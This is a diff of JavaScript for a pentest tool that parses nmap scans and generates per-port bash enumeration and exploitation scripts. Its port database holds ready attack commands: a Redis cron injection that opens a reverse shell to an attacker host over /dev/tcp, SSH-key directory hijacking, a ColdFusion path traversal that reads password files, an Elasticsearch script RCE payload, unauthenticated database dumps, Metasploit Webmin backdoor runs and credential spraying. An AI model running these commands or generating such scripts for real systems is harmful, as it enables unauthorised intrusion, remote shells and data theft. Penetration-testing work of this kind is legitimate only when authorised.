+      'redis-cli -h {IP} -p {PORT} config set dbfilename root',
+      'redis-cli -h {IP} -p {PORT} set cron_job "\\n\\n*/1 * * * * bash -i >& /dev/tcp/{LHOST}/4444 0>&1\\n\\n"',
+      'redis-cli -h {IP} -p {PORT} save',
+    ],
+    msf:['exploit/linux/redis/redis_replication_cmd_exec']
+  },
+
+  6380: { name:'Redis-TLS', color:'#cf222e', risk:'CRITICAL',
+    enum:[
+      'redis-cli -h {IP} -p {PORT} --tls --insecure ping 2>&1',
+      'redis-cli -h {IP} -p {PORT} --tls --insecure info 2>&1 | tee {OUTDIR}/redis_{PORT}_info.txt',
+      'redis-cli -h {IP} -p {PORT} --tls --insecure keys "*" 2>&1 | tee {OUTDIR}/redis_{PORT}_keys.txt',
+    ],
+    exploit:[
+      '# Same as Redis port 6379 but with --tls --insecure flags',
+      'redis-cli -h {IP} -p {PORT} --tls --insecure config set dir /root/.ssh/',
+    ],
+    msf:[]
+  },
+
+  8080: { name:'HTTP-Alt', color:'#0a7ea4', risk:'HIGH',
+    enum:[
+      'nmap -sV --script=http-title,http-headers,http-methods,http-server-header -p {PORT} {IP}',
+      'whatweb http://{IP}:{PORT} 2>&1 | tee {OUTDIR}/http_{PORT}_whatweb.txt',
+      'curl -sI http://{IP}:{PORT}/ 2>&1 | tee {OUTDIR}/http_{PORT}_headers.txt',
+      'nikto -h http://{IP}:{PORT} -o {OUTDIR}/http_{PORT}_nikto.txt 2>&1',
+      'gobuster dir -u http://{IP}:{PORT} -w {WORDLIST} -o {OUTDIR}/http_{PORT}_gobuster.txt -x php,html,txt -t 40 2>&1',
+    ],
+    exploit:[
+      'sqlmap -u "http://{IP}:{PORT}/?id=1" --batch --dbs 2>&1 | tee {OUTDIR}/http_{PORT}_sqlmap.txt',
+      'hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://{IP}:{PORT}/ -t 8 2>&1',
+    ],
+    msf:['auxiliary/scanner/http/tomcat_mgr_login','exploit/multi/http/tomcat_mgr_upload']
+  },
+
+  8082: { name:'HTTP-8082', color:'#0a7ea4', risk:'MEDIUM',
+    enum:[
+      'nmap -sV --script=http-title,http-headers -p {PORT} {IP}',
+      'curl -sI http://{IP}:{PORT}/ 2>&1 | tee {OUTDIR}/http_{PORT}_headers.txt',
+      'curl -sk http://{IP}:{PORT}/ 2>&1 | head -60',
+      'nikto -h http://{IP}:{PORT} 2>&1 | tee {OUTDIR}/http_{PORT}_nikto.txt',
+      'gobuster dir -u http://{IP}:{PORT} -w {WORDLIST} -o {OUTDIR}/http_{PORT}_gobuster.txt -t 30 2>&1',
+    ],
+    exploit:[
+      'sqlmap -u "http://{IP}:{PORT}/?id=1" --batch --dbs 2>&1 | tee {OUTDIR}/http_{PORT}_sqlmap.txt',
+      'gobuster dir -u http://{IP}:{PORT} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -o {OUTDIR}/http_{PORT}_files.txt 2>&1',
+    ],
+    msf:['auxiliary/scanner/http/http_version']
+  },
+
+  8443: { name:'HTTPS-Alt', color:'#0a7ea4', risk:'MEDIUM',
+    enum:[
+      'nmap -sV --script=ssl-cert,http-title,http-headers -p {PORT} {IP}',
+      'sslscan {IP}:{PORT} 2>&1 | tee {OUTDIR}/https_{PORT}_sslscan.txt',
+      'curl -skI https://{IP}:{PORT}/ 2>&1 | tee {OUTDIR}/https_{PORT}_headers.txt',
+      'nikto -h https://{IP}:{PORT} -ssl 2>&1 | tee {OUTDIR}/https_{PORT}_nikto.txt',
+      'gobuster dir -u https://{IP}:{PORT} -w {WORDLIST} -k -o {OUTDIR}/https_{PORT}_gobuster.txt -t 30 2>&1',
+    ],
+    exploit:[
+      'sqlmap -u "https://{IP}:{PORT}/?id=1" --batch --dbs 2>&1 | tee {OUTDIR}/https_{PORT}_sqlmap.txt',
+    ],
+    msf:['auxiliary/scanner/http/http_version']
+  },
+
+  8500: { name:'HTTP-8500', color:'#0a7ea4', risk:'MEDIUM',
+    enum:[
+      'nmap -sV --script=http-title,http-headers -p {PORT} {IP}',
+      'curl -sI http://{IP}:{PORT}/ 2>&1 | tee {OUTDIR}/http_{PORT}_headers.txt',
+      '# ColdFusion check',
+      'curl -sk http://{IP}:{PORT}/CFIDE/administrator/ 2>&1 | head -30',
+      'curl -sk http://{IP}:{PORT}/CFIDE/componentutils/ 2>&1 | head -30',
+      'nikto -h http://{IP}:{PORT} 2>&1 | tee {OUTDIR}/http_{PORT}_nikto.txt',
+    ],
+    exploit:[
+      '# ColdFusion exploit (CVE-2010-2861)',
+      'msfconsole -q -x "use exploit/windows/http/coldfusion_fckeditor; set RHOSTS {IP}; set RPORT {PORT}; run"',
+      '# ColdFusion admin bypass',
+      'curl -sk http://{IP}:{PORT}/CFIDE/administrator/index.cfm?locale=../../../../../../../lib/password.properties%00en',
+    ],
+    msf:['exploit/windows/http/coldfusion_fckeditor']
+  },
+
+  8943: { name:'HTTP-8943', color:'#0a7ea4', risk:'MEDIUM',
+    enum:[
+      'nmap -sV --script=ssl-cert,http-title -p {PORT} {IP}',
+      'curl -skI https://{IP}:{PORT}/ 2>&1 | tee {OUTDIR}/https_{PORT}_headers.txt',
+      'curl -sI http://{IP}:{PORT}/ 2>&1 >> {OUTDIR}/https_{PORT}_headers.txt',
+      'nikto -h https://{IP}:{PORT} -ssl 2>&1 | tee {OUTDIR}/https_{PORT}_nikto.txt',
+    ],
+    exploit:[
+      'gobuster dir -u https://{IP}:{PORT} -w {WORDLIST} -k -t 30 2>&1 | tee {OUTDIR}/https_{PORT}_gobuster.txt',
+    ],
+    msf:[]
+  },
+
+  9200: { name:'Elasticsearch', color:'#f59e0b', risk:'CRITICAL',
+    enum:[
+      'nmap -sV --script=http-title -p {PORT} {IP}',
+      'curl -sk http://{IP}:{PORT}/ 2>&1 | tee {OUTDIR}/es_{PORT}_info.txt',
+      'curl -sk http://{IP}:{PORT}/_cat/indices?v 2>&1 | tee {OUTDIR}/es_{PORT}_indices.txt',
+      'curl -sk http://{IP}:{PORT}/_cluster/health 2>&1',
+      'curl -sk http://{IP}:{PORT}/_nodes 2>&1 | tee {OUTDIR}/es_{PORT}_nodes.txt',
+    ],
+    exploit:[
+      '# Dump all data from unauthenticated ES',
+      'curl -sk http://{IP}:{PORT}/_search?pretty&size=1000 2>&1 | tee {OUTDIR}/es_{PORT}_dump.txt',
+      '# Dynamic script RCE (ES < 1.6)',
+      'curl -X POST "http://{IP}:{PORT}/_search" -H "Content-Type: application/json" -d \'{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"RCE":{"script":"import java.lang.*;Runtime.getRuntime().exec(\\\"id\\\")"}}}\'',
+    ],
+    msf:[]
+  },
+
+  10000: { name:'Webmin-NDMP', color:'#f59e0b', risk:'HIGH',
+    enum:[
+      'nmap -sV --script=http-title,ssl-cert -p {PORT} {IP} -oN {OUTDIR}/webmin_{PORT}_nmap.txt',
+      'curl -sk https://{IP}:{PORT}/ 2>&1 | head -30',
+      'curl -sk http://{IP}:{PORT}/ 2>&1 | head -30',
+      'nikto -h http://{IP}:{PORT} 2>&1 | tee {OUTDIR}/webmin_{PORT}_nikto.txt',
+    ],
+    exploit:[
+      '# Webmin RCE (CVE-2019-15107 / CVE-2019-15231)',
+      'msfconsole -q -x "use exploit/linux/http/webmin_backdoor; set RHOSTS {IP}; set RPORT {PORT}; set SSL true; set LHOST {LHOST}; run"',
+      '# Webmin <=1.920 RCE without auth',
+      'msfconsole -q -x "use exploit/linux/http/webmin_packageup_rce; set RHOSTS {IP}; set RPORT {PORT}; set USERNAME admin; set PASSWORD admin; set LHOST {LHOST}; run"',
+    ],
+    msf:['exploit/linux/http/webmin_backdoor','exploit/linux/http/webmin_packageup_rce']
+  },
+
+  13724: { name:'Veritas-vnetd', color:'#666688', risk:'LOW',
+    enum:[
+      'nmap -sV --script=banner -p {PORT} {IP}',
+      'nc -nv {IP} {PORT} </dev/null 2>&1 | head -5',
+    ],
+    exploit:[
+      'msfconsole -q -x "use auxiliary/scanner/misc/veritas_pbx; set RHOSTS {IP}; set RPORT {PORT}; run"',
+    ],
+    msf:[]
+  },
+
+  27017: { name:'MongoDB', color:'#1a7f37', risk:'CRITICAL',
+    enum:[
+      'nmap -sV --script=mongodb-info,mongodb-databases -p {PORT} {IP} -oN {OUTDIR}/mongo_{PORT}_nmap.txt',
+      'mongosh --host {IP} --port {PORT} --eval "db.adminCommand({listDatabases:1})" 2>&1 | tee {OUTDIR}/mongo_{PORT}_dbs.txt',
+      'mongosh --host {IP} --port {PORT} --eval "db.getUsers()" 2>&1 | tee {OUTDIR}/mongo_{PORT}_users.txt',
+    ],
+    exploit:[
+      '# Dump all collections (no auth)',
+      'mongosh --host {IP} --port {PORT} --eval "db.adminCommand({listDatabases:1}).databases.forEach(function(d){print(d.name)})" 2>&1',
+      'mongodump --host {IP} --port {PORT} --out {OUTDIR}/mongo_{PORT}_dump/ 2>&1',
+    ],
+    msf:['auxiliary/gather/mongodb_js_inject_collection_enum']
+  },
+
+  47001: { name:'WinRM-47001', color:'#0a7ea4', risk:'HIGH',
+    enum:[
+      'nmap -sV --script=http-title -p {PORT} {IP}',
+      'curl -sI http://{IP}:{PORT}/ 2>&1 | tee {OUTDIR}/winrm_{PORT}_headers.txt',
+      'crackmapexec winrm {IP} -p {PORT} -u administrator -p "" 2>&1',
+    ],
+    exploit:[
+      'evil-winrm -i {IP} -p {PORT} -u Administrator -p "Password123"',
+      'crackmapexec winrm {IP} -p {PORT} -u /tmp/users.txt -p /tmp/passwords.txt 2>&1 | tee {OUTDIR}/winrm_{PORT}_spray.txt',
+    ],
+    msf:['auxiliary/scanner/winrm/winrm_login']
+  },
+};
+
+// Generic entry for unknown ports
+function getPortEntry(portNum, svcName) {
+  const p = parseInt(portNum);
+  if (PORT_DB[p]) return PORT_DB[p];
+  // Normalize common service names
+  const s = (svcName||'').toLowerCase();
+  if (s.includes('http') && !s.includes('ssl') && !s.includes('https')) return {...PORT_DB[8082], name:'HTTP-'+portNum};
+  if (s.includes('https') || s.includes('ssl/http')) return {...PORT_DB[8443], name:'HTTPS-'+portNum};
+  if (s.includes('ms-sql') || s.includes('mssql') || s.includes('tds')) return {...PORT_DB[1433], name:'MSSQL-'+portNum};
+  if (s.includes('ftp')) return PORT_DB[21];
+  if (s.includes('ssh')) return PORT_DB[22];
+  if (s.includes('rdp') || s.includes('ms-wbt')) return PORT_DB[3389];
+  if (s.includes('mysql')) return PORT_DB[3306];
+  if (s.includes('psql') || s.includes('postgres')) return PORT_DB[5432];
+  if (s.includes('redis')) return PORT_DB[6379];
+  if (s.includes('oracle')) return PORT_DB[1521];
+  if (s.includes('smb') || s.includes('microsoft-ds') || s.includes('netbios-ssn')) return PORT_DB[445];
+  if (s.includes('winrm') || s.includes('wsman')) return PORT_DB[5985];
+  // Generic fallback
+  return {
+    name: svcName ? svcName.toUpperCase() : 'PORT-'+portNum,
+    color: '#666688', risk: 'INFO',
+    enum: [
+      'nmap -sV --script=banner,vulners -p '+portNum+' {IP} -oN {OUTDIR}/port_'+portNum+'_nmap.txt',
+      'nc -nv {IP} '+portNum+' </dev/null 2>&1 | head -10',
+    ],
+    exploit: [
+      'searchsploit "'+svcName+'" 2>&1 | tee {OUTDIR}/port_'+portNum+'_searchsploit.txt',
+      'msfconsole -q -x "search name:'+svcName+'; exit"',
+    ],
+    msf: []
+  };
+}
+
+
+
+// ── STATE ──────────────────────────────────────────────────────────────────
+let _hosts = {}; // { ip: [{port, proto, svc}] }
+let _activeHost = null;
+let _activePort = null;
+let _mode = 'enum'; // enum | xpl | all
+window._SS = {}; // script cache { bId: scriptText }
+
+// Analyzer state — declared here so AI functions can reference them before the Analyze section
+let _aFindings = [];
+let _aCreds    = [];
+let _aFiles    = [];
+let _aTab      = 'findings';
+let _aiHistory = [];
+
+// Skip ephemeral RPC ports
+function isEphemeralRPC(port, svc) {
+  const p = parseInt(port);
+  const s = (svc||'').toLowerCase().trim();
+  // Always skip Windows ephemeral dynamic RPC ports (49152+) regardless of service name
+  if (p >= 49152) return true;
+  // Skip 20000–49151 with msrpc / unknown / blank service
+  if (p >= 20000 && (s === 'msrpc' || s === '-' || s === '' || s === 'unknown')) return true;
+  // Skip explicitly labelled msrpc on any port above 10000
+  if (s === 'msrpc' && p > 10000) return true;
+  return false;
+}
+
+function isInteresting(port, svc) {
+  if (!document.getElementById('optSkipRPC').checked) return true;
+  return !isEphemeralRPC(port, svc);
+}
+
+// ── PARSERS ────────────────────────────────────────────────────────────────
+
+async 
+
+async function parseDocxFile(file) {
+  const buf = await file.arrayBuffer();
+  const zip = await JSZip.loadAsync(buf);
+  const xmlFile = zip.file('word/document.xml');
+  if (!xmlFile) throw new Error('Not a valid DOCX — word/document.xml not found');
+  const xmlStr = await xmlFile.async('string');
+  const xmlDoc = new DOMParser().parseFromString(xmlStr, 'application/xml');
+  const NS = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main';
+
+  function cellText(cell) {
+    return Array.from(cell.getElementsByTagNameNS(NS,'t'))
+      .map(t => t.textContent).join('');
+  }
+
+  const rows = Array.from(xmlDoc.getElementsByTagNameNS(NS,'tr'));
+  const result = {};
+  for (const row of rows) {
+    const cells = Array.from(row.getElementsByTagNameNS(NS,'tc'));
+    if (cells.length < 3) continue;
+    const ip = cellText(cells[1]).trim();
+    if (!/^\d+\.\d+\.\d+\.\d+$/.test(ip)) continue; // skip header
+    const portsRaw = cellText(cells[2]).trim();
+    const ports = [];
+    for (const line of portsRaw.split('\n')) {
+      const t = line.trim();
+      if (!t || !t.includes('/')) continue;
+      const parts = t.split(/\s+/);
+      const pp = parts[0].split('/');
+      const portNum = pp[0];
+      const proto = (pp[1]||'TCP').toUpperCase();
+      const svc = parts[parts.length-1] !== parts[0] ? parts[parts.length-1] : 'unknown';
+      ports.push({port: portNum, proto, svc});
+    }
+    if (ports.length) result[ip] = ports;
+  }
+  return result;
+}
+
+function parseNmapText(raw) {
+  const result = {};
+  let currentIP = null;
+
+  // Detect nmap XML format (-oX)
+  if (raw.trim().startsWith('<?xml') || raw.includes('<nmaprun')) {
+    try {
+      const xmlDoc = new DOMParser().parseFromString(raw, 'application/xml');
+      for (const host of xmlDoc.querySelectorAll('host')) {
+        const addr = host.querySelector('address[addrtype="ipv4"]');
+        if (!addr) continue;
+        const ip = addr.getAttribute('addr');
+        result[ip] = result[ip] || [];
+        for (const port of host.querySelectorAll('port')) {
+          const state = port.querySelector('state');
+          if (!state || state.getAttribute('state') !== 'open') continue;
+          const portid = port.getAttribute('portid');
+          const proto = (port.getAttribute('protocol') || 'tcp').toUpperCase();
+          const svcEl = port.querySelector('service');
+          const svc = svcEl ? (svcEl.getAttribute('name') || 'unknown') : 'unknown';
+          result[ip].push({ port: portid, proto, svc });
+        }
+      }
+      return result;
+    } catch(e) { /* fall through to text parsers */ }
+  }
+
+  // Detect compact "IP:port,port" format
+  const compactLines = raw.split('\n').filter(l => /^\d+\.\d+\.\d+\.\d+:\d/.test(l.trim()));
+  if (compactLines.length) {
+    for (const line of compactLines) {
+      const [addr, ports] = line.split(':');
+      const ip = addr.trim();
+      result[ip] = result[ip] || [];
+      for (const p of ports.split(',')) {
+        const parts = p.trim().split('/');
+        const rawP = (parts[1]||'tcp').toLowerCase();
+        const proto1 = rawP.startsWith('udp') ? 'UDP' : 'TCP';
+        const svc1 = parts[2] || (rawP.replace(/^(tcp|udp)/,'') || 'unknown');
+        result[ip].push({port:parts[0], proto:proto1, svc:svc1 || 'unknown'});
+      }
+    }
+    return result;
+  }
+
+  // Nmap normal format (-oN)
+  for (const line of raw.split('\n')) {
+    const trim = line.trim();
+    // Host line
+    const hostM = trim.match(/Nmap scan report for (?:.*\s+)?\(?(\d+\.\d+\.\d+\.\d+)\)?/);
+    if (hostM) { currentIP = hostM[1]; result[currentIP] = result[currentIP] || []; continue; }
+    // Port line: 80/tcp open http Apache
+    const portM = trim.match(/^(\d+)\/(tcp|udp)\s+open\s+(\S+)/);
+    if (portM && currentIP) {
+      result[currentIP].push({port:portM[1], proto:portM[2].toUpperCase(), svc:portM[3]});
+      continue;
+    }
+    // Greppable (-oG): Host: 1.2.3.4 () Ports: 80/open/tcp//http///
+    const grepH = trim.match(/Host:\s+(\d+\.\d+\.\d+\.\d+)/);
+    if (grepH) { currentIP = grepH[1]; result[currentIP] = result[currentIP] || []; }
+    const grepP = trim.match(/Ports:\s+(.*)/);
+    if (grepP && currentIP) {
+      for (const seg of grepP[1].split(',')) {
+        const parts = seg.trim().split('/');
+        if (parts[1] === 'open') result[currentIP].push({port:parts[0], proto:(parts[2]||'tcp').toUpperCase(), svc:parts[4]||'unknown'});
+      }
+    }
+    // Port-only list: "80", "443", "22" (one per line)
+    const numOnly = trim.match(/^(\d+)(?:\/(tcp|udp))?$/);
+    if (numOnly && !currentIP) {
+      currentIP = document.getElementById('ipOverride').value.trim() || '0.0.0.0';
+      result[currentIP] = result[currentIP] || [];
+      result[currentIP].push({port:numOnly[1], proto:(numOnly[2]||'tcp').toUpperCase(), svc:'unknown'});
+    }
+  }
+  return result;
+}
+
+
+
+// ── SCRIPT GENERATORS ─────────────────────────────────────────────────────
+
+function scriptHeader(ip, port, svc, type, db) {
+  const border = '═'.repeat(64);
+  const date = new Date().toISOString().split('T')[0];
+  const outDir = document.getElementById('outDir').value.trim() || './results';
+  return [
+    '#!/bin/bash',
+    '# ' + border,
+    '# PORT ' + port + ' — ' + db.name + ' — ' + (type === 'enum' ? 'ENUMERATION' : 'EXPLOITATION'),
+    '# Target  : ' + ip,
+    '# Service : ' + svc,
+    '# Risk    : ' + db.risk,
+    '# Date    : ' + date,
+    '# TOOL    : AA-VAPT Nmap PT',
+    '# ' + border,
+    '# ⚠  AUTHORIZED PENTESTING ONLY — DO NOT USE WITHOUT WRITTEN PERMISSION',
+    '# ' + border,
+    '',
+    "RED='\\033[0;31m'; GRN='\\033[0;32m'; YLW='\\033[1;33m'",
+    "CYN='\\033[0;36m'; BLU='\\033[0;34m'; BLD='\\033[1m'; NC='\\033[0m'",
+    '',
+    'IP="' + ip + '"',
+    'PORT="' + port + '"',
+    'SVC="' + svc + '"',
+    'LHOST="${LHOST:-YOUR_ATTACKER_IP}"',
+    'TARGET_USER="${TARGET_USER:-sa}"',
+    'TARGET_PASS="${TARGET_PASS:-}"',
+    'OUTDIR="' + outDir + '/$IP/port_' + port + '"',
+    'WORDLIST="' + (document.getElementById('wordlist').value.trim() || '/usr/share/wordlists/dirb/common.txt') + '"',
+    '',
+    'mkdir -p "$OUTDIR"',
+    '',
+    'log()  { echo -e "${BLD}[*]${NC} $1"; }',
+    'ok()   { echo -e "${GRN}[+]${NC} $1"; }',
+    'warn() { echo -e "${YLW}[!]${NC} $1"; }',
+    'run()  { echo -e "${CYN}[>]${NC} $@"; eval "$@"; echo; }',
+    '',
+    'echo -e "\\n${BLD}${BLU}╔══════════════════════════════════════════╗${NC}"',
+    'echo -e "${BLD}${BLU}║  ' + (type === 'enum' ? '🔍 ENUM' : '💥 EXPLOIT') + ' :: $IP:$PORT ($SVC)          ║${NC}"',
+    'echo -e "${BLD}${BLU}╚══════════════════════════════════════════╝${NC}\\n"',
+    '',
+  ].join('\n');
+}
+
+function scriptFooter(ip, port, type) {
+  return [
+    '',
+    'echo -e "\\n${GRN}[✔] Done. Output: $OUTDIR${NC}"',
+    '',
+  ].join('\n');
+}
+
+function buildCmds(cmds, ip, port, svc) {
+  const outDir = document.getElementById('outDir').value.trim() || './results';
+  const wordlist = document.getElementById('wordlist').value.trim() || '/usr/share/wordlists/dirb/common.txt';
+  const optBrute = document.getElementById('optBrute').checked;
+  const optMSF = document.getElementById('optMSF').checked;
+  const optNSE = document.getElementById('optNSE').checked;
+
+  let lines = [];
+  for (let cmd of cmds) {
+    let c = cmd
+      .replace(/\{IP\}/g, '$IP')
+      .replace(/\{PORT\}/g, '$PORT')
+      .replace(/\{OUTDIR\}/g, '$OUTDIR')
+      .replace(/\{WORDLIST\}/g, '$WORDLIST')
+      .replace(/\{LHOST\}/g, '$LHOST')
+      .replace(/\{SVC\}/g, '$SVC')
+      .replace(/\{user\}/g, '$TARGET_USER')   // FIX BUG2: substitute credentials
+      .replace(/\{pass\}/g, '$TARGET_PASS');
+
+    if (c.startsWith('#')) {
+      lines.push('');
+      lines.push('# ' + c.slice(1).trim());
+    } else if (!optBrute && (c.includes('hydra') || c.includes('medusa') || c.includes('ncrack'))) {
+      lines.push('# [BRUTE SKIP] ' + c);
+    } else if (!optMSF && c.includes('msfconsole')) {
+      lines.push('# [MSF SKIP] ' + c);
+    } else if (c.includes('<<EOF')) {
+      // FIX BUG3: heredoc commands must NOT be wrapped in run() — execute directly
+      lines.push(c);
+    } else {
+      lines.push('run ' + c);
+    }
+  }
+  return lines.join('\n');
+}
+
+function generateEnumScript(ip, port, svc) {
+  const db = getPortEntry(port, svc);
+  let s = scriptHeader(ip, port, svc, 'enum', db);
+  s += '\nlog "Starting ' + db.name + ' enumeration on $IP:$PORT"\n\n';
+  s += buildCmds(db.enum, ip, port, svc);
+  s += scriptFooter(ip, port, 'enum');
+  return s;
+}
+
+function generateExploitScript(ip, port, svc) {
+  const db = getPortEntry(port, svc);
+  let s = scriptHeader(ip, port, svc, 'exploit', db);
+  s += '\nwarn "Starting ' + db.name + ' exploitation — AUTHORIZED PENTEST ONLY"\n\n';
+  if (db.msf && db.msf.length && document.getElementById('optMSF').checked) {
+    s += '# Metasploit modules for ' + db.name + ':\n';
+    for (const m of db.msf) s += '# msfconsole -q -x "use ' + m + '; set RHOSTS $IP; run"\n';
+    s += '\n';
+  }
+  s += buildCmds(db.exploit, ip, port, svc);
+  s += scriptFooter(ip, port, 'exploit');
+  return s;
+}
+
+// ── UI ─────────────────────────────────────────────────────────────────────
+
+async function handleFileUpload(file) {
+  if (!file) return;
+  const ok = document.getElementById('uploadOk');
+  ok.style.display = 'block';
+  ok.textContent = '⏳ Parsing ' + file.name + '…';
+  try {
+    let parsed;
+    if (file.name.endsWith('.docx')) {
+      parsed = await parseDocxFile(file);
+    } else {
+      const text = await file.text();
+      parsed = parseNmapText(text);
+    }
+    mergeHosts(parsed);
+    ok.style.color = 'var(--green)';
+    ok.textContent = '✅ ' + file.name + ' — ' + Object.keys(parsed).length + ' host(s) loaded';
+    renderHostList();
+  } catch(e) {
+    ok.textContent = '❌ Parse error: ' + e.message;
+    ok.style.color = 'var(--red)';
+  }
+}
+
+function mergeHosts(parsed) {
+  for (const [ip, ports] of Object.entries(parsed)) {
+    const override = document.getElementById('ipOverride').value.trim();
+    const finalIP = override || ip;
+    if (!_hosts[finalIP]) _hosts[finalIP] = [];
+    for (const p of ports) {
+      const exists = _hosts[finalIP].some(x => x.port === p.port && x.proto === p.proto);
+      if (!exists) _hosts[finalIP].push(p);
+    }
+  }
+}
+// ── FILE UPLOAD ─────────────────────────────────────────────
+function handleFiles(fileList) {
+  const ok = document.getElementById('uploadOk');
+  if (!ok) return;
+
+  if (!fileList || !fileList.length) {
+    ok.style.color = 'var(--red)';
+    ok.textContent = '❌ No files received';
+    return;
+  }
+
+  const all = Array.from(fileList);
+  ok.style.color = 'var(--yellow, #f59e0b)';
+  ok.textContent = '⏳ Reading ' + all.length + ' file(s)…';
+
+  // Skip obvious binaries, read everything else
+  const skip = ['.exe','.dll','.zip','.gz','.tar','.pdf','.png','.jpg','.jpeg','.gif','.mp4','.docx','.xlsx','.pptx'];
+  const files = all.filter(f => f.size > 0 && f.size < 10*1024*1024 && !skip.some(e => f.name.toLowerCase().endsWith(e)));
+
+  if (!files.length) {
+    ok.style.color = 'var(--red)';
+    ok.textContent = '❌ No readable files found (' + all.length + ' scanned)';
+    return;
+  }
+
+  let pending = files.length, loaded = 0, errors = 0, noData = 0;
+
+  function done() {
+    const hc = Object.keys(_hosts).length;
+    ok.style.color = hc > 0 ? 'var(--green)' : 'var(--red)';
+    ok.textContent = hc > 0
+      ? '✅ ' + loaded + '/' + files.length + ' files → ' + hc + ' host(s)'
+      : '❌ Read ' + files.length + ' files: ' + loaded + ' parsed, ' + noData + ' no-data, ' + errors + ' errors';
+    if (hc > 0) autoGenerate();
+  }
+
+  for (const file of files) {
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      try {
+        const text = e.target.result || '';
+        const parsed = parseNmapText(text);
+        const hCount = Object.keys(parsed).length;
+        if (hCount > 0) { mergeHosts(parsed); loaded++; }
+        else { noData++; }
+      } catch(err) {
+        errors++;
+        console.error('Parse error', file.name, err);
+      }
+      pending--;
+      // Update progress every 20 files
+      if (pending % 20 === 0 || pending === 0) {
+        ok.textContent = '⏳ ' + (files.length - pending) + '/' + files.length + ' read, ' + loaded + ' hit(s)…';
+      }
+      if (pending === 0) done();
+    };
+    reader.onerror = function() {
+      errors++;
+      if (--pending === 0) done();
+    };
+    reader.readAsText(file);
+  }
+}
+
+function autoGenerate() {
+  renderHostList();
+  const firstIP = Object.keys(_hosts)[0];
+  if (firstIP && !_activeHost) selectHost(firstIP);
+  document.getElementById('rtool').style.display = 'flex';
+  document.getElementById('statsbar').style.display = 'flex';
+  const mb = document.getElementById('masterBtns');
+  if (mb) mb.style.display = 'flex';
+  updateStats();
+}
+
+// Drag-drop
+document.addEventListener('DOMContentLoaded', () => {
+  const zone = document.getElementById('upZone');
+  if (!zone) return;
+  zone.addEventListener('dragover',  e => { e.preventDefault(); zone.classList.add('drag'); });
+  zone.addEventListener('dragleave', () => zone.classList.remove('drag'));
+  zone.addEventListener('drop', e => {
+    e.preventDefault(); zone.classList.remove('drag');
+    if (e.dataTransfer.files.length) handleFiles(e.dataTransfer.files);
+  });
+});
+
+// ── GENERATE (from textarea) ────────────────────────────────
+function runGenerate() {
+  const raw = document.getElementById('nmapIn').value.trim();
+  if (raw) mergeHosts(parseNmapText(raw));
+  if (!Object.keys(_hosts).length) { alert('No hosts found. Upload a file or paste nmap output.'); return; }
+  autoGenerate();
+}
+
+// ── HOST LIST ───────────────────────────────────────────────
+function renderHostList() {
+  const wrap = document.getElementById('hostListWrap');
+  const list = document.getElementById('hostList');
+  const badge = document.getElementById('hostCountBadge');
+  const ips = Object.keys(_hosts);
+  if (!ips.length) { wrap.style.display = 'none'; return; }
+  wrap.style.display = 'block';
+  badge.textContent = '(' + ips.length + ')';
+  list.innerHTML = '';
+  for (const ip of ips) {
+    const ports = _hosts[ip];
+    const interesting = ports.filter(p => isInteresting(p.port, p.svc));
+    const svcs = [...new Set(interesting.map(p => p.svc).filter(s => s && s !== 'unknown' && s !== '-'))].slice(0,3);
+    const div = document.createElement('div');
+    div.className = 'hchip' + (ip === _activeHost ? ' active' : '');
+    div.onclick = function() { selectHost(ip); };
+    div.innerHTML =
+      '<span class="hchip-ip">' + ip + '</span>' +
+      '<span class="hchip-svc">' + svcs.join(',') + '</span>' +
+      '<span class="hchip-cnt">' + interesting.length + ' ports</span>';
+    list.appendChild(div);
+  }
+}
+
+// ── SELECT HOST ─────────────────────────────────────────────
+function selectHost(ip) {
+  _activeHost = ip;
+  _activePort = null;
+  document.querySelectorAll('.hchip').forEach(c => c.classList.toggle('active', c.querySelector('.hchip-ip') && c.querySelector('.hchip-ip').textContent === ip));
+  renderPortList(ip);
+  renderScripts();
+}
+
+// ── PORT LIST (middle column) ────────────────────────────────
+function renderPortList(ip) {
+  const list = document.getElementById('portList');
+  const label = document.getElementById('portHostLabel');
+  const countEl = document.getElementById('portCount');
+  label.textContent = ip || '';
+
+  if (!ip || !_hosts[ip]) {
+    list.innerHTML = '<div class="empty-mid"><div class="empty-mid-ico">🔌</div><div class="empty-mid-t">Select a host</div></div>';
+    countEl.textContent = '';
+    return;
+  }
+
+  const colorMap = {CRITICAL:'#cf222e',HIGH:'#bc4c00',MEDIUM:'#f59e0b',LOW:'#1a7f37',INFO:'#0a7ea4'};
+  const ports = _hosts[ip].filter(p => isInteresting(p.port, p.svc));
+  countEl.textContent = ports.length + ' open';
+
+  if (!ports.length) {
+    list.innerHTML = '<div class="empty-mid"><div class="empty-mid-ico">🔍</div><div class="empty-mid-t">No interesting ports</div></div>';
+    return;
+  }
+
+  list.innerHTML = '';
+  for (const {port, proto, svc} of ports) {
+    const db = getPortEntry(port, svc);
+    const rc = colorMap[db.risk] || '#666688';
+    const div = document.createElement('div');
+    div.className = 'port-item' + (port === _activePort ? ' active' : '');
+    div.onclick = function() { jumpToPort(port); };
+    div.innerHTML =
+      '<span class="port-badge" style="color:' + db.color + ';border-color:' + db.color + '44">' + port + '/' + proto + '</span>' +
+      '<span class="port-svc">' + db.name + '</span>' +
+      '<span class="port-risk" style="color:' + rc + ';background:' + rc + '18">' + db.risk + '</span>';
+    list.appendChild(div);
+  }
+}
+
+function jumpToPort(port) {
+  _activePort = (_activePort === port) ? null : port; // toggle: click again to show all
+  document.querySelectorAll('.port-item').forEach(el => {
+    const badge = el.querySelector('.port-badge');
+    el.classList.toggle('active', _activePort && badge && badge.textContent.startsWith(_activePort + '/'));
+  });
+  renderScripts(); // re-render right panel filtered to this port
+}
+
+// ── RENDER SCRIPTS (right panel) ────────────────────────────
+function renderScripts() {
+  const out = document.getElementById('scriptOut');
+  const ip = _activeHost;
+  if (!ip || !_hosts[ip]) {
+    out.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:8px;color:var(--text3)"><div style="font-size:40px;opacity:.1">📡</div><div style="font-size:12px">Select a host</div></div>';
+    return;
+  }
+
+  const ports = _hosts[ip].filter(p => isInteresting(p.port, p.svc));
+  if (!ports.length) {
